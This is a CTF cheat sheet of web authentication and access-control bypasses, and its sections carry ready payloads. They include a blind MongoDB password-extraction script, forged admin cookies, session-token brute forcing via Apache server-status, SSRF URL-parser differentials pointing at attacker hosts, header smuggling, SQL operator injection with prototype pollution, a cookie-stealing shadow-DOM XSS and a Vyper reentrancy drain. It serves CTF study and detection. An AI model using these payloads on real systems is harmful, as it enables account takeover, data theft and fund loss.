# CTF Web - Auth & Access Control Attacks

## Table of Contents
- [Password/Secret Inference from Public Data](#passwordsecret-inference-from-public-data)
- [Weak Signature/Hash Validation Bypass](#weak-signaturehash-validation-bypass)
- [Client-Side Access Gate Bypass](#client-side-access-gate-bypass)
- [NoSQL Injection (MongoDB)](#nosql-injection-mongodb)
  - [Blind NoSQL with Binary Search](#blind-nosql-with-binary-search)
- [Cookie Manipulation](#cookie-manipulation)
- [Host Header Bypass](#host-header-bypass)
- [Hidden API Endpoints](#hidden-api-endpoints)
- [Open Redirect Chains](#open-redirect-chains)
- [Subdomain Takeover](#subdomain-takeover)
- [Apache mod_status Information Disclosure + Session Forging (29c3 CTF 2012)](#apache-mod_status-information-disclosure--session-forging-29c3-ctf-2012)
- [Two-Parser URL Differential (Root-Me "Proxifier")](#two-parser-url-differential-root-me-proxifier)
- [Hop-by-Hop Header Smuggling to Strip Auth Headers (Root-Me Snippet 04)](#hop-by-hop-header-smuggling-to-strip-auth-headers-root-me-snippet-04)
- [node-mysql Operator Object Injection + __proto__ Pollution (Root-Me "Simple Login")](#node-mysql-operator-object-injection--__proto__-pollution-root-me-simple-login)
- [Declarative Shadow DOM NodeIterator Sanitizer Bypass (Root-Me "Perfect Notes")](#declarative-shadow-dom-nodeiterator-sanitizer-bypass-root-me-perfect-notes)
- [Vyper @nonreentrant Cross-Function Lock Scope Bug (Root-Me Snippet 03)](#vyper-nonreentrant-cross-function-lock-scope-bug-root-me-snippet-03)
For JWT/JWE token attacks, see [auth-jwt.md](auth-jwt.md). For OAuth/OIDC, SAML, CI/CD credential theft, and infrastructure auth attacks, see [auth-infra.md](auth-infra.md). For 2024-2026 era techniques (EHAX, Nullcon, srdnlen, UTCTF, BYPASS, FCSC, HTB, Midnightflag, RWCTF), see [auth-and-access-2.md](auth-and-access-2.md).

---

## Password/Secret Inference from Public Data

**Pattern (0xClinic):** Registration uses structured identifier (e.g., National ID) as password. Profile endpoints expose enough to reconstruct most of it.

**Exploitation flow:**
1. Find profile/API endpoints that leak "public" user data (DOB, gender, location)
2. Understand identifier format (e.g., Egyptian National ID = century + YYMMDD + governorate + 5 digits)
3. Calculate brute-force space: known digits reduce to ~50,000 or less
4. Brute-force login with candidate IDs

---

## Weak Signature/Hash Validation Bypass

**Pattern (Illegal Logging Network):** Validation only checks first N characters of hash:
```javascript
const expected = sha256(secret + permitId).slice(0, 16);
if (sig.toLowerCase().startsWith(expected.slice(0, 2))) { // only 2 chars!
    // Token accepted
}
```
Only need to match 2 hex chars (256 possibilities). Brute-force trivially.

**Detection:** Look for `.slice()`, `.substring()`, `.startsWith()` on hash values.

---

## Client-Side Access Gate Bypass

**Pattern (Endangered Access):** JS gate checks URL parameter or global variable:
```javascript
const hasAccess = urlParams.get('access') === 'letmein' || window.overrideAccess === true;
```

**Bypass:**
1. URL parameter: `?access=letmein`
2. Console: `window.overrideAccess = true`
3. Direct API call — skip UI entirely

---

## NoSQL Injection (MongoDB)

### Blind NoSQL with Binary Search
```python
def extract_char(position, session):
    low, high = 32, 126
    while low < high:
        mid = (low + high) // 2
        payload = f"' && this.password.charCodeAt({position}) > {mid} && 'a'=='a"
        resp = session.post('/login', data={'username': payload, 'password': 'x'})
        if "Something went wrong" in resp.text:
            low = mid + 1
        else:
            high = mid
    return chr(low)
```

**Why simple boolean injection fails:** App queries with injected `$where`, then checks if returned user's credentials match input exactly. `'||1==1||'` finds admin but fails the credential check.

---

## Cookie Manipulation
```bash
curl -H "Cookie: role=admin"
curl -H "Cookie: isAdmin=true"
```

## Host Header Bypass
```http
GET /flag HTTP/1.1
Host: 127.0.0.1
```

## Hidden API Endpoints
Search JS bundles for `/api/internal/`, `/api/admin/`, undocumented endpoints.

Also fuzz with authenticated cookies/tokens, not just anonymous requests. Admin-only routes are often hidden and may be outside `/api` (for example `/internal/flag`).

---

## Apache mod_status Information Disclosure + Session Forging (29c3 CTF 2012)

**Pattern:** Apache's `mod_status` endpoint (`/server-status`) is left enabled and accessible, leaking active request URLs, client IP addresses, and request parameters. Combined with session pattern analysis, this enables session forging to impersonate authenticated users.

**Reconnaissance:**
```bash
# Check if mod_status is enabled
curl http://target/server-status
curl http://target/server-status?auto   # machine-readable format

# Also try common info-leak endpoints
curl http://target/server-info          # mod_info (Apache config details)
curl http://target/.htaccess            # sometimes readable
```

**Information leaked by /server-status:**
- Active request URLs (including admin panels like `/admin`)
- Client IP addresses of authenticated users
- Query parameters and POST data fragments
- Virtual host configurations
- Worker thread status and request duration

**Attack chain:**
1. Discover `/server-status` is accessible
2. Identify admin endpoints (e.g., `/admin`) and admin IP addresses from active requests
3. Analyze session token patterns from visible `Cookie` or `Set-Cookie` headers
4. Forge a valid session token by reproducing the pattern (e.g., predictable session IDs based on IP, timestamp, or username)
5. Replay the forged session to access admin functionality

```bash
# Extract admin session info from server-status
curl -s http://target/server-status | grep -i 'admin\|session\|cookie'

# If session tokens follow a predictable pattern (e.g., md5(username+ip+timestamp)):
python3 -c "
import hashlib, time
admin_ip = '10.0.0.1'  # observed from server-status
ts = int(time.time())
for offset in range(-10, 10):
    token = hashlib.md5(f'admin{admin_ip}{ts+offset}'.encode()).hexdigest()
    print(token)
"
```

**Key insight:** `/server-status` is a goldmine for session analysis — it reveals who is authenticated, what endpoints exist, and sometimes exposes session tokens directly. Always check for it during reconnaissance. The endpoint is enabled by default in many Apache installations and is often left accessible due to misconfigured `<Location>` directives.

**Detection:** During initial recon, check `/server-status`, `/server-info`, and `/status`. If the response contains HTML with worker tables and request details, `mod_status` is active. Automated scanners like `nikto` and `nuclei` flag this automatically.

---

## Two-Parser URL Differential (Root-Me "Proxifier")

**Pattern:** App uses two URL parsers with different error-handling behaviour — e.g., `url-parse` for an access-control check, and `parse-url@7.0.2` for the actual fetch. Disagreement lets the same URL string be classified as "safe" by the first parser and "attacker-controlled" by the second.

**Canonical payload:**
```
https://:root-me.org//127.0.0.1/etc/passwd
```
- `url-parse` → host = `root-me.org` (passes allow-list).
- `parse-url@7.0.2` → falls back to `file://` with path `127.0.0.1/etc/passwd` after parse failure → reads local file / hits internal service.

**Why it works:** the userinfo delimiter (`:`) is empty before the host; `url-parse` ignores it, `parse-url` chokes and fails over to a default scheme.

**Attack template:** whenever the server shows two URL library names in package.json (e.g. `url-parse`, `parse-url`, `whatwg-url`, Node built-in `URL`), enumerate differentials:
- Empty userinfo: `https://:target//evil.host/path`
- Backslash host: `https://evil.host\@target`
- Unicode dot host: `https://target。evil.host/`
- Double `@`: `https://safe@evil@target`
- Missing scheme: `//target/../../evil.host`

Then send each through both code paths and log the resolved host.

Source: [blog.root-me.org/posts/writeup_ctf10k_proxifier](https://blog.root-me.org/posts/writeup_ctf10k_proxifier/).

---

## Hop-by-Hop Header Smuggling to Strip Auth Headers (Root-Me Snippet 04)

**Pattern:** Python/Flask app behind nginx/Varnish trusts `X-Real-IP` (set by proxy) for admin gating. Attacker leverages HTTP/1.1 hop-by-hop mechanism (`Connection: <header-name>`) to *delete* the trusted header before it reaches the backend.

```http
GET / HTTP/1.1
Host: target
Connection: close, X-Real-IP
X-Real-IP: 8.8.8.8
```
The `Connection: X-Real-IP` instructs the next hop (Varnish) to strip `X-Real-IP` as "hop-by-hop". Flask then sees *no* `X-Real-IP` header and falls back to the server-local default (often `127.0.0.1`), unlocking admin.

**Two-step chain used in the Root-Me challenge:**
1. Combine with a **userinfo SSRF** (`/@attacker.com`) so the middle proxy fetches a resource whose response reflects the admin gating decision.
2. Smuggle the `Connection: X-Real-IP` to have the proxy strip the outbound auth header at the SSRF hop.

**Defensive tell:** apps that read `X-Real-IP` / `X-Forwarded-For` without validating they came *from* the trusted proxy layer. Always add the header name to the allow-list of preserved headers, or move to mTLS / unix sockets for trust boundaries.

Source: [blog.root-me.org/posts/writeup_snippet_04](https://blog.root-me.org/posts/writeup_snippet_04/).

---

## node-mysql Operator Object Injection + __proto__ Pollution (Root-Me "Simple Login")

**Pattern:** Node.js backend uses the `mysql` library, which supports *object* operators: `{col: {operator: value}}` → rendered as `col OPERATOR value`. If the app does `WHERE ? `, it passes `req.body` directly — `req.body.password` being an object bypasses string type checks **and** can smuggle SQL operators.

**Payload (bypass equality AND typeof-string check via prototype-pollution):**
```json
{
  "username": "admin",
  "password": { "password": {"password": 1} }
}
```
Renders roughly as:
```sql
WHERE username = 'admin' AND password = `password` = `password` = 1
```
`'password' = 'password'` → 1. `1 = 1` → 1. Tautology → admin login.

**Why `__proto__` appears:** some payloads inject `__proto__` into `req.body` so downstream `typeof password === 'string'` checks succeed (pollutes Object prototype). Combine:
```json
{"__proto__":{"password":"anything"}, "password":{"password":{"password":1}}}
```
— prototype pollution + operator smuggle in one payload.

**Spot:** Node + `mysql` or `mysql2` + `WHERE ?` / `.query(q, req.body)`. Any code that doesn't explicitly coerce `req.body.X` to `String()` is vulnerable.

Source: [blog.root-me.org/posts/writeup_ctf10k_simple_login](https://blog.root-me.org/posts/writeup_ctf10k_simple_login/).

---

## Declarative Shadow DOM NodeIterator Sanitizer Bypass (Root-Me "Perfect Notes")

**Pattern:** Custom HTML sanitizer walks the DOM with `document.createNodeIterator(root, NodeFilter.SHOW_ELEMENT)` to strip scriptable attributes. `NodeIterator` / `TreeWalker` do **not** descend into Shadow DOM trees — so content inside a `<template shadowrootmode="open">` is never inspected.

**Payload:**
```html
<div>
  <template shadowrootmode="open">
    <img src=x onerror="fetch('/'+document.cookie)">
  </template>
</div>
```
When the sanitized HTML is injected via `innerHTML` into the page, modern browsers **materialise** the declarative shadow root automatically, executing the `onerror` — despite the sanitizer having "looked at" the HTML.

**Chain in Perfect Notes:** HttpOnly cookie cannot be read, so exfil via side-channel: visit `/` → 302 leaks session UUID via `Location` header observable from a sandboxed iframe load event.

**Spot:** any sanitizer that relies on `NodeIterator`/`TreeWalker`/`querySelectorAll(*)` without manually recursing into `shadowRoot`. Also applies to server-side parsers (jsdom, cheerio) that don't know about `shadowrootmode`.

Source: [blog.root-me.org/posts/writeup_ctf10k_perfect_notes](https://blog.root-me.org/posts/writeup_ctf10k_perfect_notes/).

---

## Vyper @nonreentrant Cross-Function Lock Scope Bug (Root-Me Snippet 03)

**Pattern:** Vyper's `@nonreentrant("lock_name")` decorator, in versions prior to the fix, did **not** share lock state across functions with the same name — each function had its own instance. So `buyStock` marked `@nonreentrant("lock")` can re-enter `sellStock` (also `@nonreentrant("lock")`) through an external callback, without tripping either lock.

**Attack shape:**
```vyper
@external
@nonreentrant("lock")
def buyStock(amount: uint256):
    self._transfer_from(msg.sender, amount)       # external call hook here
    self.stock[msg.sender] += amount

@external
@nonreentrant("lock")
def sellStock(amount: uint256):
    self._refund(msg.sender, amount)
    self.stock[msg.sender] -= amount
```
Attacker contract `_transfer_from` callback calls `sellStock` → refund issued *before* `buyStock` records the purchase → drain.

**Real-world parallel:** Curve Vyper reentrancy (July 2023) — same root cause. Worth knowing because any "old Vyper" CTF chall with `@nonreentrant` on multiple functions almost certainly expects this exploit.

**Spot:** Vyper `< 0.3.x` (check `pragma`) with two or more `@nonreentrant("lock")` functions that both interact with the same storage var, at least one invoking an external hook (ERC777 `tokensReceived`, raw `.call`, etc.).

Source: [blog.root-me.org/posts/writeup_snippet_03](https://blog.root-me.org/posts/writeup_snippet_03/).

---

